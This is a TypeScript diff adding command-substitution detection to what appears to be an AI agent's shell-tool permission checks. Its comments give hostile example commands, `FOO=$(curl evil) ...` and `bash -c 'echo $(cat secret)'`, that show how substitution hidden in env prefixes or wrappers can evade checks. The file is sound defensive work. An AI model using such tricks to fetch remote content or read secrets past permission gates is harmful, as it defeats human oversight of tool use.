@@ -1202,6 +1202,67 @@ export function detectCommandSubstitution(command: string): boolean {
 }
 
 /**
+ * User-facing warning emitted when a shell-tool invocation contains
+ * command substitution (`$(...)`, backticks, `<(...)`, or `>(...)`).
+ * Shared across the shell-tool and monitor-tool confirmation paths so
+ * the wording can't drift between sites — see #4386 review (round 3).
+ */
+export const COMMAND_SUBSTITUTION_WARNING =
+  'Contains command substitution ($(...), backticks, <(...), or >(...)).';
+
+/**
+ * Single dual-check predicate: does the command contain shell command
+ * substitution either as written (raw) or after `stripShellWrapper`
+ * unwraps it? The raw check catches substitution that lives inside
+ * leading env-prefix tokens (e.g. `FOO=$(curl evil) bash -c 'echo ok'`,
+ * where stripShellWrapper discards the env-prefix AND unwraps to
+ * `echo ok`, leaving no trace of the substitution). The stripped
+ * check catches substitution inside the wrapper's quoted body
+ * (e.g. `bash -c 'echo $(cat secret)'`, where the raw `$(` sits inside
+ * outer single quotes and is invisible to a raw-only check).
+ *
+ * Used by `buildShellExecWarnings` (UI warning surface),
+ * `shouldAuditSubstitutionBypass` (audit log gate), and the
+ * pre-AST gates in `ShellToolInvocation.getDefaultPermission`,
+ * `MonitorToolInvocation.getDefaultPermission`, and
+ * `PermissionManager.resolveDefaultPermission`. Centralising the
+ * dual-check here keeps detection semantics in lockstep across all
+ * surfaces (a change here propagates to every consumer). See PR #4386
+ * round 6 for the env-prefix wrapper regression that motivated this.
+ */
+export function hasShellSubstitution(rawCommand: string): boolean {
+  if (typeof rawCommand !== 'string' || rawCommand.length === 0) return false;
+  if (detectCommandSubstitution(rawCommand)) return true;
+  const stripped = stripShellWrapper(rawCommand);
+  return stripped !== rawCommand && detectCommandSubstitution(stripped);
+}
+
+/**
+ * Build the warnings array for a shell-like tool's exec confirmation.
+ * Returns `undefined` when nothing to flag — callers should only assign
+ * the `warnings` field when the result is truthy, mirroring the
+ * existing `if (warnings.length > 0)` pattern at each call site.
+ *
+ * Delegates the detection logic to `hasShellSubstitution` so the
+ * dual-check semantics stay in one place; the historical 2-arg
+ * signature is kept for callers that already have both forms in scope.
+ */
+export function buildShellExecWarnings(
+  strippedCommand: string,
+  rawCommand: string,
+): string[] | undefined {
+  // Either input may carry the substitution. Use the dual-aware
+  // predicate so the detection logic is identical to the audit-log path.
+  if (
+    hasShellSubstitution(rawCommand) ||
+    detectCommandSubstitution(strippedCommand)
+  ) {
+    return [COMMAND_SUBSTITUTION_WARNING];
+  }
+  return undefined;
+}
+
+/**
  * Checks a shell command against security policies and permission rules.
  *
  * Uses PermissionManager (via config.getPermissionManager()) to evaluate each
